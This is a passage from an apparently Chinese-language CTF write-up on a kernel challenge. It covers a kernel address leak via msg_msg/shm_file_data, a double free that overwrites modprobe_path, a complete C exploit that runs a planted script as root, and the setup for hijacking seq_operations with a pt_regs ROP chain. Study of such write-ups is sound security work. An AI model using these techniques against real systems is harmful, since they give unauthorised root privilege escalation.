list（因为消息头大于已经大于0x20了，所以不能让消息头命中，只能通过segment命中,而且让消息头命中会破坏msg_msg结构体的list_head双链表，）。然后通过驱动把那块object再次free，然后再申请shm_file_data，那么刚刚被free的object有可能命中从而被写上shm_file_data的数据。由从而msg_msg的segment已经被改写成了shm_file_data的数据，我们直接recv掉就可以获取</p><p>那么实际上我们申请的message的总大小应该是0xfd0+(0x20-8) = 0xfe8</p><p>需要注意的一点是，<strong>利用<code>shm_file_data</code>结构体泄露完内存基址的时候，我们最好及时的将其释放</strong>。我观察到似乎进行系统调用时系统会自动将其释放，解引用了<code>struct ipc_namespace *ns</code>指针。如果后续申请到了这个object然后对其进行破坏了的话会造成缺页故障然后panic，我观察到的问题出在<code>shm_close+26</code>对某个非法的地址进行了读取操作,调试可知道其中<code>rbx</code>寄存器指向的是<code>struct ipc_namespace *ns</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff813cadd0 &lt;shm_close&gt;:      push   r14</span><br><span class="line">0xffffffff813cadd2 &lt;shm_close+2&gt;:    push   r13</span><br><span class="line">0xffffffff813cadd4 &lt;shm_close+4&gt;:    push   r12</span><br><span class="line">0xffffffff813cadd6 &lt;shm_close+6&gt;:    push   rbp</span><br><span class="line">0xffffffff813cadd7 &lt;shm_close+7&gt;:    push   rbx</span><br><span class="line">0xffffffff813cadd8 &lt;shm_close+8&gt;:    mov    rax,QWORD PTR [rdi+0xa0]</span><br><span class="line">0xffffffff813caddf &lt;shm_close+15&gt;:   mov    rbp,QWORD PTR [rax+0xc8]</span><br><span class="line">0xffffffff813cade6 &lt;shm_close+22&gt;:   mov    rbx,QWORD PTR [rbp+0x8]</span><br><span class="line">0xffffffff813cadea &lt;shm_close+26&gt;:   lea    r12,[rbx+0x1b8]</span><br></pre></td></tr></table></figure><p>释放的方法如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) </span><br><span class="line">    Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Analysis-解法一-任意地址写modprode-path"><a href="#Analysis-解法一-任意地址写modprode-path" class="headerlink" title="Analysis.解法一:任意地址写modprode_path"></a>Analysis.解法一:任意地址写modprode_path</h2><p>当内核没有开启slab_freelist_hardened(这是一种类似用户态下对bin中链向其他chunk进行异或加密的操作)的时候,我们可以利用double free进行任意地址写(类似tcachebin poisioning那样)，那么写哪里比较好呢？</p><p>这里介绍一个东西，叫做<code>modprode_path</code> 。当我们在内核当中安装或者卸载新模块的时候就会执行这个程序。而这个程序的路径保存在内核当中，是一个全局变量，默认为<code>/sbin/modprobe</code>,可以通过命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/modprobe</span><br></pre></td></tr></table></figure><p>来查看。当内核运行一个错误格式的文件(或者未知文件类型的文件)的时候也会调用这个程序，并且运行这个程序的时候是具有root权限的。</p><p>内核当中保存了这个程序的路径，而且是可以更改的。那么我们就可以更改这个路径为我们自己写的bash文件，使得运行错误文件的时候就会运行这个bash文件，进而输出flag。</p><p>如果有符号的话我们可以直接通过gdb来输出这个地址来确定偏移。</p><p><img src="https://s2.loli.net/2023/01/21/kM7D95bjavR4Tqt.png" alt=""> </p><p>如果没有的话我们可以先通过/proc/kallsyms找到__request_module的地址，然后查看汇编，就能找到对其的引用。</p><p><img src="https://s2.loli.net/2023/01/21/zBdF7PTJsheVKG2.png" alt=""></p><p>其中这个<__request_module+70>比较的地方就是modprode_path的地址</p><p><img src="https://s2.loli.net/2023/01/21/D3kCiuTZpFrBMGQ.png" alt=""></p><p>所以我们通过任意地址写就能更改这个路径，进而执行具有root权限的程序，更改flag文件的读写权限。</p><p>具体的写上链上的下个object的地址的位置(偏移offset)可以gdb看一下(不像用户态下的堆块，next_chunk地址偏移固定)</p><p>不过说实话由于不能像用户态下方便的通过pwndbg插件的命令<code>heap</code>看单链表到底长啥样，所以具体申请几次才能得到我们想要的地方还得多调试几次。在buf那打个内存断点，然后看看申请的堆块地址。</p><p><img src="https://s2.loli.net/2023/01/28/a25Y4nhZPzuwSWK.png" alt=""></p><p>exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_SIZE 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82850580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff8100d3d3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_VAL_RET 0xffffffff8111347b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE    0xffffffff81e00ef4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RET 0xffffffff81e01058</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_CLOSE 0xffffffff8124b180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRETQ 0xffffffff8102b4df</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">int</span> dev_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Error</span><span class="params">(<span class="keyword">char</span>* error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m [?] %s\033[0m\n&quot;</span>,error);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Doing</span><span class="params">(<span class="keyword">char</span> * Doing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m [*] %s \033[0m\n&quot;</span>,Doing);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Done</span><span class="params">(<span class="keyword">char</span> *Done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] %s \033[0m\n&quot;</span>,Done);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span>-<span class="keyword">sizeof</span>(struct msg_msg)+SHM_SIZE-<span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;uafmsg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> index;</span><br><span class="line">    <span class="keyword">int32_t</span> len;</span><br><span class="line">    <span class="keyword">void</span>* ptr;</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;request;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int32_t</span> index,<span class="keyword">int32_t</span> len,<span class="keyword">void</span> * ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    req.len = len;</span><br><span class="line">    req.ptr = ptr;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int32_t</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> shmid;</span><br><span class="line"><span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmget Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmat Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Doing(<span class="string">&quot;Start Leaking addr&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">void</span>* recv = <span class="built_in">malloc</span>(<span class="number">0x1018</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span>(qid&lt;<span class="number">0</span>)</span><br><span class="line">        Error(<span class="string">&quot;Make Queue Error&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;uafmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(uafmsg));</span><br><span class="line">    writeMsg(qid,&amp;uafmsg,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span>* shm_addr=open_shm_file();</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) <span class="comment">//****注意要释放，否则会kernel panic</span></span><br><span class="line">        Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    readMsg(qid,recv,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    kernel_base = ((<span class="keyword">uint64_t</span>*)recv)[<span class="number">0x1fb</span>]- <span class="number">0x19ac6c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] kernel_base_addr is %lx \033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="built_in">free</span>(recv);</span><br><span class="line">    Done(<span class="string">&quot;leaking Dne&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret;</span><br><span class="line"><span class="keyword">uint64_t</span> init_cred;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds;</span><br><span class="line"><span class="keyword">uint64_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/bad_file&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27; &gt; /tmp/change_flag&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/bad_file&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/change_flag&quot;</span>);</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev_fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Error(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> offset  = leak_addr()-BASE;</span><br><span class="line">    <span class="keyword">uint64_t</span> Path_To_write =offset+ BASE+<span class="number">0x18510a0</span>;</span><br><span class="line"></span><br><span class="line">    Doing(<span class="string">&quot;Start to alloc Modepath&quot;</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> * buf = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    buf[<span class="number">2</span>] = Path_To_write;<span class="comment">//具体offset偏移可以通过调试</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span>*)buf,<span class="string">&quot;/tmp/change_flag&quot;</span>);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);<span class="comment">//此时申请到的就是modprobe_path</span></span><br><span class="line">    system(<span class="string">&quot;/tmp/bad_file&quot;</span>);</span><br><span class="line">    <span class="comment">// system(&quot;/bin/sh&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下图所示</p><p><img src="https://s2.loli.net/2023/01/28/zBYTywCIuJ3ktfR.png" alt=""></p><h2 id="Analysis-解法二-劫持控制流提权"><a href="#Analysis-解法二-劫持控制流提权" class="headerlink" title="Analysis.解法二:劫持控制流提权"></a>Analysis.解法二:劫持控制流提权</h2><p>既然有了任意次的UAF，那么我们可以考虑堆喷某些结构体然后进行劫持控制流，比如tty_struct是一个常见的用来劫持控制流的东西。</p><p>比较朴素的思路大致如下，先通过驱动申请一个合适大小的object然后释放放入freelist，然后堆喷msg_msg命中释放的object，再次free那个object造成UAF，然后再申请tty_struct这样msg_msg就能控制tty_struct。但是有个问题msg_msg的消息内容无法随意更改，这样就造成了我们无法劫持函数指针。这样我们就陷入了僵局。那么我们就必须寻求其他方式进行写，可行的办法有很多，比如利用setxattr,利用sk_buff。当然，题目在申请object的时候提供了写操作，所以我们可以直接利用它来写。但是我们并不能为了做题而做题，如果没给写的操作我们也应利用其他方法完成。这里为了学习，我把几种方法都尝试并且记录了一下</p><h3 id="PLAN1-题目提供的写操作"><a href="#PLAN1-题目提供的写操作" class="headerlink" title="PLAN1.题目提供的写操作"></a>PLAN1.题目提供的写操作</h3><h4 id="seq-operations结构体劫持控制流"><a href="#seq-operations结构体劫持控制流" class="headerlink" title="seq_operations结构体劫持控制流"></a>seq_operations结构体劫持控制流</h4><p>我选用的是<code>seq_operations</code>这个结构体来劫持控制流(我不知道<code>shm_file_data</code>是否能劫持控制流，回头可以尝试一下)，它的大小是0x20，由<code>kmalloc-32</code>申请，定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们打开<code>/proc/self/stat</code>文件时，就会在内核空间分配一个<code>seq_operations</code>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure><p>当读一个stat文件时，内核会调用<code>proc_read_iter</code>指针，其默认值为<code>seq_read_iter()</code> ,有如下逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">seq_read_iter</span><span class="params">(struct kiocb *iocb, struct iov_iter *iter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> = <span class="title">iocb</span>-&gt;<span class="title">ki_filp</span>-&gt;<span class="title">private_data</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>也就是说会调用<code>seq_operations</code>的start指针。所以我们只要<strong>改写seq_operations-&gt;start然后读取对应文件</strong>即可劫持控制流</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="comment">//... change the seq_operations-&gt;start</span></span><br><span class="line">read(seq_fd,buf,size);<span class="comment">//(或者直接用内联汇编的方式syscall来read。并且这样还能控制其他寄存器，方便我们在pt_regs上面布置ROP链)</span></span><br></pre></td></tr></table></figure><h4 id="利用pt-regs结构布置ROP"><a href="#利用pt-regs结构布置ROP" class="headerlink" title="利用pt_regs结构布置ROP"></a>利用pt_regs结构布置ROP</h4><p>另外还有一个比较有趣的知识点是关于<code>pt_regs</code>的，这是一个方便于我们进行ROP以及栈迁移的结构。当我们进行系统调用时，从用户态陷入内核态，其中就会通过门结构进入到内核的<code>entry_SYSCALL_64</code>函数，然后通过系统调用表跳转到相应的函数。执行<code>entry_SYSCALL_64</code>函数的时候会通过这条指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax&#x3D;$-ENOSYS</span><br></pre></td></tr></table></figure><p>来将用户态下的寄存器压入内核栈上，形成<code>pt_regs</code>结构体，这个结构体在内核栈的栈底，其定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> 